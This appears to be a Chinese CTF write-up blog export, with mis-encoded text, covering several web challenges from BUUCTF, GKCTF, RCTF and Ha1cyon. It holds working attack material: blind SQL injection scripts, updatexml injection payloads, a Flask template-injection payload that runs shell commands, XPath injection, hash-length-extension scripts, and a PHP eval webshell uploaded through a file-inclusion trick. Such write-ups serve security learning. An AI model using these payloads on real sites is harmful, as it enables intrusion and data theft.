'http://a1b1ea65-d14e-445c-a719-c623ba26a122.node3.buuoj.cn/backend/content_detail.php?id='\nmark='[]'\n\n'''\ndef table_name():\n   #list = []\n   # for k in range(0,4):#è¡¨ä¸ªæ•°\n    name=''\n    for j in range(1,20):\n        for i in 'sqcwertyuioplkjhgfdazxvbnm_0123456789,':          \n            url = urll+\"1^if(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))='%s',1,0)\" %(j,i)                               \n            r = requests.get(url)\n            if mark in r.text:\n                name = name+i\n                print(name)\n                break\n    #list.append(name)\n    print('table_name:',name)\ntable_name()\n'''\n'''\ndef column_name():\n    #list = []\n    #for k in range(0,3): #åˆ¤æ–­è¡¨é‡Œæœ€å¤šæœ‰4ä¸ªå­—æ®µ\n    name=''\n    for j in range(1,40): #åˆ¤æ–­ä¸€ä¸ª å­—æ®µåæœ€å¤šæœ‰9ä¸ªå­—ç¬¦ç»„æˆ\n        for i in 'sqcwertyuioplkjhgfdazxvbnm_0123456789,':\n            url=urll+\"1^if(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),%d,1)='%s',1,0)\" %(j,i)\n            r=requests.get(url)\n            if mark in r.text:\n                name=name+i\n                break\n    #list.append(name)\n    print ('column_name:',name)\ncolumn_name()\n'''\n\ndef res_name():\n    name = ''\n    for j in range(1,20): \n        for i in 'sqcwertyuioplkjhgfdazxvbnm_0123456789,':\n            url = urll+\"1^if(substr((select(group_concat(username))from(admin)),%d,1)='%s',1,0)\" %(j,i)\n            # password from admin\n            r = requests.get(url)\n            if mark in r.text:\n                name = name+i\n                \n                print(name)\n                \n                break\n    print('res_name:',name)\nres_name()\n```\n[Black-Watch-å…¥ç¾¤é¢˜-Web](http://www.ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/#Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-Web)\nè´´ä¸ªåˆ«äººçš„exp  \né‚£æˆ‘è¿™ä¸ªifè¯­å¥æ˜¯ä¸æ˜¯æœ‰ç‚¹å¤šä½™...\nä»–æ˜¯åˆ©ç”¨asciiçš„å¤§å°æ¯”è¾ƒç›´æ¥å‡ºçš„ç»“æœ\n\n# [GKCTF2020]CheckIN\nç›´æ¥ä¼ ä¸ªä¸€å¥è¯æœ¨é©¬ä¸Šå»,èšå‰‘b64ç¼–ç å™¨è¿ä¸€ä¸‹\n\næ‰§è¡Œreadflagå°±å¯ä»¥è¯»åˆ°flag\n[php7-gc-bypass](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)\nèšå‰‘è„šæœ¬ä¼ åˆ°/tmpä¸‹  \n\n`include('/tmp/exp.php');`\n\nåœ¨è„šæœ¬ä¸­æ”¹ä¸º\n```\npwn(\"echo `/readflag`\");\n```\n\n# [GKCTF2020]EZä¸‰å‰‘å®¢-EzNode\nè¿™ä¸ªå’ŒNPUCTFçš„éªŒè¯ğŸä¸€æ ·çš„\næºç :\n```js\napp.use((req, res, next) => {\n  if (req.path === '/eval') {\n    let delay = 60 * 1000;\n    console.log(delay);\n    if (Number.isInteger(parseInt(req.query.delay))) {\n      delay = Math.max(delay, parseInt(req.query.delay));\n    }\n    const t = setTimeout(() => next(), delay);\n    //delayç§’åæ‰§è¡Œnext()\n    // 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹\n    setTimeout(() => {\n      clearTimeout(t);\n      console.log('timeout');\n      try {\n        res.send('Timeout!');\n      } catch (e) {\n\n      }\n    }, 1000);\n    //1såæ‰§è¡Œtimeout\n  } else {\n    next();\n  }\n});\n\napp.post('/eval', function (req, res) {\n  let response = '';\n  if (req.body.e) {\n    try {\n      response = saferEval(req.body.e);\n    } catch (e) {\n      response = 'Wrong Wrong Wrong!!!!';\n    }\n  }\n  res.send(String(response));\n});\n```\nè¿™é‡Œnext()çš„æ„æ€æ˜¯æ‰§è¡Œä¸‹ä¸€ä¸ªè·¯ç”±\n\næˆ‘çš„ç†è§£æ˜¯å¦‚æœè¯´delay>1sï¼Œé‚£ä¹ˆåé¢çš„setTimeout()å‡½æ•°å°±ä¼šæ‰§è¡Œï¼Œä¹Ÿå°±ä¼šå‡ºç°å›æ˜¾\"Timeoutï¼\"  \næˆ‘ä»¬éœ€è¦è®©tçš„setTimeout()æ›´å¿«æ‰§è¡Œå®Œæ¯•  \nä»setTimeout()å…¥æ‰‹\n[setTimeout](http://nodejs.cn/api/timers.html#timers_settimeout_callback_delay_args)\n>å½“ delay å¤§äº 2147483647 æˆ–å°äº 1 æ—¶ï¼Œåˆ™ delay å°†ä¼šè¢«è®¾ç½®ä¸º 1è¡Œ\n\n[saferEval_issue](https://github.com/commenthol/safer-eval/issues/10)\n![](05.png)\n\n# [RCTF2015]EasySQL\næ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹å¯†ç ï¼ŒçŒœæµ‹æ˜¯äºŒæ¬¡æ³¨å…¥  \næ³¨å†Œ`1\"`ï¼Œchangepwd.phpå›æ˜¾`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"1\"\" and pwd='c4ca4238a0b923820dcc509a6f75849b'' at line 1`  \næŠ¥é”™æ³¨å…¥  \næ³¨å†Œå¤„usernameæ³¨å…¥åæ˜ åœ¨å¯†ç ä¿®æ”¹ç•Œé¢  \nusernameï¼Œemailè¿‡æ»¤\n```\nç©ºæ ¼ @ order limit mid substr and right left\n```\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#\nXPATH syntax error: '~article,flag,users~'\n```\n\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1)#\nXPATH syntax error: '~flag~'\n```\n\n```\n1\"||updatexml(1,concat(0x7e,(select(flag)from(flag)),0x7e),1)#\nXPATH syntax error: '~RCTF{Good job! But flag not her'\n```\nupdatexml()è¾“å‡ºæœ‰é•¿åº¦é™åˆ¶ï¼Œ32ä½  \n\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')regexp('^r')),0x7e),1)#\nXPATH syntax error: '~name,pwd,email,real_flag_1s_her'\n```\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1)#\nXPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'\n```\næœ‰ç”¨çš„æ•°æ®åº”è¯¥åœ¨`xxx`ä¹‹å\n```\n1\"||updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!='xxx')),0x7e),1)#\nXPATH syntax error: '~flag{d507ee9e-9482-426f-8f0d-1c'\n```\næˆªå–å­—ç¬¦ä¸²çš„å‡½æ•°è²Œä¼¼éƒ½å·®ä¸å¤šè¿‡æ»¤äº†  \nå•Šè¿˜å¯ä»¥é€†åºè¾“å‡ºå•Š....  \n```\n1\"||updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here!='xxx'))),0x7e),1)#\n}5de64062c7c1-d0f8-f624-2849-e9\n```\n\n[regexpç›²æ³¨](https://xz.aliyun.com/t/5356)\n>æ­£å¸¸çš„è¯­å¥ä¸ºï¼šselect username from users where id = 1\næ­£å¸¸è¿”å›ï¼šadmin\næ„é€ è¯­å¥ï¼š\nselect (select username from users where id = 1) regexp '^a' è¿”å›çœŸ(1)\nselect (select username from users where id = 1) regexp '^b' è¿”å›å‡(0)\nå› ä¸ºè¿™é‡Œ'^a'æ˜¯åŒ¹é…ä»¥aå¼€å¤´çš„å­—ç¬¦ä¸²ï¼ŒåŸæ¥æ­£å¸¸è¿”å›çš„å°±æ˜¯adminï¼Œæ‰€ä»¥ä¼šè¿”å›çœŸã€‚\nç»§ç»­å°±å¯ä»¥ä½¿ç”¨ regexp '^ad'...è¯»å‡ºæƒ³è¦çš„æ•°æ®\n\nå¯ä»¥é€šè¿‡æ­£åˆ™åŒ¹é…æ¥è¾“å‡ºæŒ‡å®šæ•°æ®  \nä»¥æ­¤æ¥è¾“å‡ºfå¼€å¤´çš„å†…å®¹\n```\n1\"||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')regexp('^r'))),1))#\n```\n# [GYCTF2020]FlaskApp\nç†Ÿæ‚‰ä¸‹  \nè§£å¯†ç•Œé¢è¾“å…¥b64çš„{{config}}ä¼šæœ‰å›æ˜¾  \n\n`'DEBUG':True`  \nè§£å¯†ç•Œé¢åªè¦æäº¤æ— æ³•b64decodeçš„valueå°±å¯ä»¥å›æ˜¾æŠ¥é”™ç•Œé¢ï¼Œå¯ä»¥å€Ÿæ­¤å¾—åˆ°ä¸€äº›æºç ä¿¡æ¯    \n```\n@app.route('/decode',methods=['POST','GET'])\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"ç»“æœ ï¼š {0}\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        â€‹res =  render_template_string(tmp)\n```\næœ‰ä¸ªwaf,åº”è¯¥è¿‡æ»¤äº†äº›ä¸œè¥¿  \n\nä¹‹å‰å†™isccçš„æ—¶å€™æ‰¾åˆ°çš„expæ¨¡æ¿æ”¹ä¸€æ”¹(X\nå¤§æ¦‚è¿‡æ»¤äº†`eval import popen os ls`ï¼ˆçŒœçš„\n\n```\n{% for c in [].__class__.__base__.__subclasses__() %} #æ‰¾åˆ°èƒ½ç”¨çš„function\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'ev'+'al' in b.keys() %}\n      {{ b['ev'+'al']('__imp'+'ort__'+'(\"o'+'s\")'+'.po'+'pen'+'(\"l'+'s\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}\n```\nå›æ˜¾\n```\n app.py static templates\n```\n\nè¯»app.py\n\n```py\ndef waf(str): black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\", \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"] \n  for x in black_list : \n    if x in str.lower() : \n        return 1 \n```\nç„¶åï¼Œ`ls /`\n```\napp bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys this_is_the_flag.txt tmp usr var\n```\n```\n{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == 'catch_warnings' %}\n  {% for b in c.__init__.__globals__.values() %}\n  {% if b.__class__ == {}.__class__ %}\n    {% if 'ev'+'al' in b.keys() %}\n      {{ b['ev'+'al']('__imp'+'ort__'+'(\"o'+'s\")'+'.po'+'pen'+'(\"c'+'at /this_is_the_fl'+'ag.txt\").read()') }}\n    {% endif %}\n  {% endif %}\n  {% endfor %}\n{% endif %}\n{% endfor %}\n```\n>__class__:è·å¾—å½“å‰å¯¹è±¡çš„ç±»\n__bases__:åˆ—å‡ºå…¶åŸºç±»\n__mro__ :åˆ—å‡ºè§£ææ–¹æ³•çš„è°ƒç”¨é¡ºåºï¼Œç±»ä¼¼äºbases\n__subclasses__()ï¼šè¿”å›å­ç±»åˆ—è¡¨\n__dict__ ï¼š åˆ—å‡ºå½“å‰å±æ€§/å‡½æ•°çš„å­—å…¸\nfunc_globalsè¿”å›ä¸€ä¸ªåŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸å¼•ç”¨\n\n# [GKCTF2020]cveç‰ˆç­¾åˆ°\nnetworkï¼š  \nhint:flag in localhost  \ntips:Host must be end with '123'  \n\nè®©url=127.0.0.1  \nä½†æ˜¯é¢˜ç›®è¯´`you can just view *.ctfhub.com`   \nç»“åˆé¢˜ç›®åœ¨php/7.3.15ç‰ˆæœ¬ä¸‹å¯»æ‰¾èƒ½ç»•è¿‡.ctfhub.comçš„cve  \n[CVE-2020-7066](http://vulhub.org.cn/vuln/VH-CVE-2020-7066)  \n>åœ¨ä½äº7.2.29çš„PHPç‰ˆæœ¬7.2.xï¼Œä½äº7.3.16çš„7.3.xå’Œä½äº7.4.4çš„7.4.xä¸­ï¼Œå°†get_headersï¼ˆï¼‰ä¸ç”¨æˆ·æä¾›çš„URLä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¦‚æœURLåŒ…å«é›¶ï¼ˆ\\ 0ï¼‰å­—ç¬¦ï¼Œåˆ™URLå°†è¢«é™é»˜åœ°æˆªæ–­\n  \n`payload:?url=http://127.0.0.123%00.ctfhub.com`\n\n\n\n","tags":["practice"]},{"title":"Ha1cyon_CTF","url":"/2020/04/19/Ha1cyon-CTF/","content":"\n# web\n## æŸ¥æºç \nå¦‚é¢˜  \n\n## RealEzPHP\næºç \n```php\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n```\nååºåˆ—åŒ–  \n$b($a)=>$bæ˜¯ä¸ªå‡½æ•°å    \nflagåœ¨phpinfoé‡Œ  \nä¸è¿‡s:0:\"\";æ˜¯ä¸è¡Œçš„  \n![](01.png)\n```\nO:8:\"HelloPhp\":2:{s:1:\"a\";s:2:\"-1\";s:1:\"b\";s:7:\"phpinfo\";}\n```\n\n## ezlogin\n### å‰å¯¼çŸ¥è¯†\næŠ“åŒ…ä¿¡æ¯å‘ç°xmlè¯·æ±‚=>1.xxe 2.xpathç›²æ³¨  \n[XPathæ³¨å…¥æŒ‡åŒ—](https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/)  \n[xpathæ³¨å…¥è¯¦è§£](https://www.cnblogs.com/backlion/p/8554749.html)\n![](03.png)\næŸ¥è¯¢è¯­å¥:  \n$query = \"/root/users/user[username/text()='\".$name.\"' and password/text()='\".$pwd.\"']\";  \n\n1.ä¸‡èƒ½å¯†ç :\n```\n$name => admin' or '1\n$pwd => \n```\n2.ç›²æ³¨\n\nåˆ¤æ–­æ ¹èŠ‚ç‚¹æ•°é‡ï¼š\n```\n$name=>' or count(/)=1 or '1\n```\ncount(/)=nè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™ä»£è¡¨æœ‰nä¸ªæ ¹èŠ‚ç‚¹  \n\nè·å–åå­—é•¿åº¦:\n```\n$name=>' or string-length(name(/*[1]))=n or '1\n```\nè‹¥è¿”å›æ­£å¸¸ï¼Œåˆ™ç¬¬ä¸€ä¸ªæ ¹èŠ‚ç‚¹åé•¿åº¦ä¸ºn\n\nè·å–å†…å®¹:\n```\n$name=>'or substring(name(/*[1]),1,1)='a' or '1\n```\né€ä¸ªå­—ç¬¦éå†ç¬¬ä¸€ä¸ªæ ¹èŠ‚ç‚¹åå­—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ range('a','z')  \nå½“è¿”å›æ­£å¸¸æ—¶å¯ç¡®å®šå…¶å­—ç¬¦\n\n### é¢˜ç›®\nç”¨æˆ·åè¾“å…¥ 'or count(/)=n or '1æµ‹è¯•æ˜¯å¦èƒ½æ³¨å…¥,nä»1å¼€å§‹å– \nå–1æ—¶æ˜¾ç¤ºéæ³•æ“ä½œï¼Œå–2æ˜¾ç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œå­˜åœ¨æ³¨å…¥   \nè„šæœ¬æ¥è‡ª[NPUCTF ezlogin](http://phoebe233.cn/index.php/archives/35/)\n>re.findall(pattern, string, flags=0)  \nè¿”å›stringä¸­æ‰€æœ‰ä¸patternç›¸åŒ¹é…çš„å…¨éƒ¨å­—ä¸²ï¼Œè¿”å›å½¢å¼ä¸ºæ•°ç»„\n\n>ç™»å½•ç•Œé¢éœ€è¦ä¿å­˜sessionï¼Œå¦åˆ™ä¼šè¿”å›\"è¯·ç™»å½•\"ä¿¡æ¯ï¼Œæ— æ³•ç™»å½•\n\n```python\nimport requests\nimport re\nsess = requests.session()\nstrs='abcdefghijklmnopqrstuvwxyzABCDEFZHIJKLMNOPQRSTUVWKYZ1234567890'\nheaders = {'Content-Type':'application/xml'}\nparam='<input type=\"hidden\" id=\"token\" value=\"(.*?)\" />'\n#tokenä¼šè¿‡æœŸå˜åŒ–ï¼Œæ‰€ä»¥ç”¨æ­£åˆ™åŒ¹é…ä»»æ„token\nt=''\nfor i in range(1,50):\n    for s in strs:\n        url='http://ha1cyon-ctf.fun:30015/login.php'\n        token=re.findall(param,sess.get(url).text)[0]\n\n        #str(i)ä»£è¡¨ç¬¬nä¸ªposï¼Œpwdéšæ„å–å€¼\n        #ç¬¬ä¸€ä¸ªæ ¹èŠ‚ç‚¹ä¸ºroot\n        #data=\"<username>' or substring(name(/*[1]), '\"+str(i)+\"', 1)='\"+str(s)+\"' or '1</username><password>123</password><token>\"+token+\"</token>\"\n\n        #ç¬¬äºŒä¸ªèŠ‚ç‚¹ä¸ºaccounts\n        #data = \"<username>' or substring(name(/root/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹ä¸ºuser\n        #data = \"<username>' or substring(name(/root/accounts/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #éå†[1][2][3],åœ¨userèŠ‚ç‚¹ä¸‹å¾—åˆ°idï¼Œusernameï¼Œpassword\n        #name(/root/accounts/user/*[1])\n        #name(/root/accounts/user/*[2])\n        #name(/root/accounts/user/*[3])\n        #data = \"<username>' or substring(name(/root/accounts/user/*[1]), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #ä¹‹åå–userä¸‹çš„å­èŠ‚ç‚¹usernameï¼ˆuser[1]ï¼‰ï¼Œå¾—åˆ° gtfly123\n        #å–ç¬¬äºŒä¸ªå­èŠ‚ç‚¹user[2]ç»“æœæ˜¯adm1n\n        #data = \"<username>' or substring(/root/accounts/user[1]/username/text(), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n\n        #æ±‚adm1nçš„å¯†ç \n        #data = \"<username>' or substring(/root/accounts/user[2]/password/text(), '\" + str(i) + \"', 1)='\" + str(s) + \"' or '1</username><password>123</password><token>\" + token + \"</token>\"\n        res=sess.post(url=url,headers=headers,data=data)\n        if 'éæ³•æ“ä½œ' in res.text:\n            t+=s\n            print(t)\n            break\n```\næ ¼å¼ä¸º\n```xml\n<root>\n    <accounts>\n        <user>\n            <id></id>\n            <username>gtfly123</username>\n            <password>xxxxxxxxxx</password>\n        </user>\n        <user>\n            <id></id>\n            <username>adm1n</username>\n            <password>xxxxxxxxx</password>\n        </user>\n    </accounts>\n</root>\n```\nmd5è§£å¯†åç™»å½•åå°ï¼Œæ–‡ä»¶åŒ…å«å¯ç”¨å¤§å°å†™ç»•è¿‡\n```\n/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag\n```\n\n## ezinclude\nhashæ‹“å±•æ”»å‡»,å€ŸåŠ©hashpumpå·¥å…·[HashPump](https://github.com/bwall/HashPump)  \nexample:\n```\ninput:hashpump -s '6d5f807e23db210bc254a28be2d6759a0f5f5d99' --data 'count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo' -a '&waffle=liege' -k 14\n\noutput:\n0e41270260895979317fff3898ab85668953aaa2\ncount=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02(&waffle=liege\n```\n\n~~è¿™é¢˜å¥½åƒå½“æ—¶ç»™äº†ä¸¤ä¸ªhintè¯´æ˜¯å–œæ¬¢æ”¾å‡flag?~~\n![](04.png)\nå¯ä»¥è”æƒ³åˆ°hashæ‹“å±•æ”»å‡»  \nåœ¨cookieé‡Œå¯ä»¥è·å–åˆ°hashå€¼  \nä½†æ˜¯æ²¡æœ‰æä¾›å¯†é’¥é•¿åº¦æ‰€ä»¥éœ€è¦è„šæœ¬çˆ†ç ´  \n```python\nimport os\nimport requests\nfor i in range(1,12):\n    data=os.popen('hashpump -s de73312423b835b22bfdc3c6da7b63e9 -d admin -k '+str(i)+' -a admin').read()\n    name=data.split('\\n')[0]\n    password=data.split('\\n')[1].replace('\\\\x','%') #urlencode\n    result=requests.get('http://192.168.0.166/index.php?name='+password+'&pass='+name).text\n    print(result)\n```\nğŸ‘†å®˜æ–¹å†™çš„è„šæœ¬ï¼Œä¸è¿‡å¤ç°çš„æ—¶å€™å¤±è´¥äº†  \n![](05.png)\nå®˜æ–¹åº”è¯¥æ˜¯æƒ³å€ŸåŠ©åŸæœ¬ä¸ä¼ å€¼æ—¶çš„hashå€¼æ¥æ±‚å‡º$nameçš„å€¼  \nä¸è¿‡ç›´æ¥ä¼ nameçš„å€¼ç„¶åå¾—åˆ°å¯¹åº”çš„$passä¹Ÿå¯ä»¥0.0  \n~~åˆæ„Ÿè§‰åˆ°æ€ç»´çš„é™åˆ¶äº†~~\nå¾—åˆ°flflflflag.php  \nè¿›å…¥åæœ‰\n```html\n<html>\n\n<head>\n    <script language=\"javascript\" type=\"text/javascript\">\n        window.location.href=\"404.html\";\n    </script>\n    <title>this_is_not_fl4g_and_å‡ºé¢˜äºº_wants_girlfriend</title>\n</head>\n<>\n\n    <body>\n        include($_GET[\"file\"])</body>\n\n</html>\n```\nåœ¨è¯·æ±‚å¤´é‡Œå¯ä»¥çœ‹è§phpçš„ç‰ˆæœ¬æ˜¯7.0.33  \n[æ–‡ä»¶åŒ…å«çš„ä¸€äº›getshellå§¿åŠ¿](https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/)  \n[LFI via SegmentFault-ç‹ä¸€èˆª](https://www.jianshu.com/p/dfd049924258)\n[è‡ªåŒ…å«,php7segment faultç›¸å…³](https://www.aqniukt.com/article/257)\n>è¿™é‡Œè¦è¯´çš„æ˜¯åœ¨å«æœ‰æ–‡ä»¶åŒ…å«æ¼æ´çš„åœ°æ–¹ï¼Œä½¿ç”¨php://filter/string.strip_tagså¯¼è‡´php7 segment faultï¼Œå¦‚æœåŒæ—¶ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªtmp fileå°±ä¼šä¸€ç›´ç•™åœ¨tmpç›®å½•(<php7.2)ï¼Œå†è¿›è¡Œæ–‡ä»¶åçˆ†ç ´å°±å¯ä»¥getshell\nâ€¢ php7.0.0-7.1.2å¯ä»¥åˆ©ç”¨ï¼Œ 7.1.2xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤  \n\nâ€¢ php7.1.3-7.2.1å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.1xç‰ˆæœ¬çš„å·²è¢«ä¿®å¤  \n\nâ€¢ php7.2.2-7.2.8å¯ä»¥åˆ©ç”¨ï¼Œ 7.2.9ä¸€ç›´åˆ°7.3åˆ°ç°åœ¨çš„ç‰ˆæœ¬å·²è¢«ä¿®å¤  \n```python\nimport requests\nimport re\nfile_data={\n    'file': \"<?php eval($_POST[1]);\"\n}\nurl=\"http://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\ntry:\n    r=requests.post(url=url,files=file_data,allow_redirects=False)\nexcept:\n        print(1)\n```\nå®˜æ–¹è¯´çš„æ˜¯è®¿é—®http://192.168.0.128:8105/dir.php\nå°±å¯ä»¥å¾—åˆ°ä¸´æ—¶æ–‡ä»¶å  \n~~ä½†æ˜¯ä¸èƒ½ç”¨æ‰«æå™¨ä¹Ÿæ²¡æœ‰hint,dir.phpå“ªæ¥çš„~~\nhttp://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=/tmp/phpFqq1b1&1=phpinfo();\nflagåœ¨phpinfo();é‡Œ  \næ‰€ä»¥ğŸ‘†ç›´æ¥è®¿é—®å°±å¥½\n\n## éªŒè¯ğŸ\næºç \n```js\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieSession = require('cookie-session');\n\nconst fs = require('fs');\nconst crypto = require('crypto');\n\nconst keys = require('./key.js').keys;\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\nfunction saferEval(str) {\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n} // 2020.4/WORKER1 æ·¦ï¼Œä¸Šæ¬¡çš„åº“å¤ªåƒåœ¾ï¼Œæˆ‘è‡ªå·±å†™äº†ä¸€ä¸ª\n\nconst template = fs.readFileSync('./index.html').toString();\nfunction render(results) {\n  return template.replace('{{results}}', results.join('<br/>'));\n}\n\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: false }));\napp.use(bodyParser.json());\n\napp.use(cookieSession({\n  name: 'PHPSESSION', // 2020.3/WORKER2 å˜¿å˜¿ï¼Œç»™ğŸ‘´çˆªâ‘§\n  keys\n}));\n\nObject.freeze(Object);\nObject.freeze(Math);\n\napp.post('/', function (req, res) {\n  let result = '';\n  const results = req.session.results || [];\n  const { e, first, second } = req.body;\n  if (first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])) {\n    if (req.body.e) {\n      try {\n        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';\n      } catch (e) {\n        console.log(e);\n        result = 'Wrong Wrong Wrong!!!';\n      }\n      results.unshift(`${req.body.e}=${result}`);\n    }\n  } else {\n    results.unshift('Not verified!');\n  }\n  if (results.length > 13) {\n    results.pop();\n  }\n  req.session.results = results;\n  res.send(render(req.session.results));\n});\n\n// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPI\napp.get('/source', function (req, res) {\n  res.set('Content-Type', 'text/javascript;charset=utf-8');\n  res.send(fs.readFileSync('./index.js'));\n});\n\napp.get('/', function (req, res) {\n  res.set('Content-Type', 'text/html;charset=utf-8');\n  req.session.admin = req.session.admin || 0;\n  res.send(render(req.session.results = req.session.results || []))\n});\n\napp.listen(80, '0.0.0.0', () => {\n  console.log('Start listening')\n});\n```\nå‡ºç°\n>app.use(bodyParser.json());æ¥æ”¶jsonè¯·æ±‚\njsonç»•è¿‡  \né¦–å…ˆè¦æ»¡è¶³\n>first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])\n```\n\"first\":{\"length\":\"1\"},\"second\":{\"length\":\"1\"}\n```\nè®¾å®šfirstä¸secondçš„lengthå€¼ç›¸ç­‰ï¼Œæœ¬è´¨ä¸Šfirstå’Œsecondåœ¨æ­¤æ—¶æ˜¯ä¸åŒçš„ä¸¤ä¸ªå¯¹è±¡(åœ°å€ä¸åŒ)  \nè€Œå¯¹äºmd5çš„ç›¸ç­‰,ä¸stringç›¸åŠ æ—¶ä¼šå¼ºåˆ¶è½¬æ¢ä¸ºstringï¼Œè€Œfirstä¸secondçš„stringå€¼æ˜¯ç›¸åŒçš„  \nä¹‹åå°è¯•ç»•è¿‡\n```js\nfunction saferEval(str) { //e\n  if (str.replace(/(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| /g, '')) {\n    return null;\n  }\n  return eval(str);\n}\n```\n>stringObject.replace(regexp/substr,replacement)\n>å¦‚æœ regexp å…·æœ‰å…¨å±€æ ‡å¿— gï¼Œé‚£ä¹ˆ replace() æ–¹æ³•å°†æ›¿æ¢æ‰€æœ‰åŒ¹é…çš„å­ä¸²ã€‚å¦åˆ™ï¼Œå®ƒåªæ›¿æ¢ç¬¬ä¸€ä¸ªåŒ¹é…å­ä¸²\nå¯¹äº\n```\n(?:Math(?:\\.\\w+)?)|[()+\\-*/&|^%<>=,?:]|(?:\\d+\\.?\\d*(?:e\\d+)?)| \n```\n![](Ha1cyon-CTF/06.png)\n>\\w+åŒ¹é…æ•°å­—å’Œå­—æ¯ä¸‹åˆ’çº¿çš„å¤šä¸ªå­—ç¬¦\né€šè¿‡åŸå‹é“¾å®ç°RCE  \n>æ— æ³•ç›´æ¥è¾“å…¥å­—ç¬¦ä¸²,Math.\\_\\_proto\\_\\_æ— æ³•ç›´æ¥åˆ©ç”¨  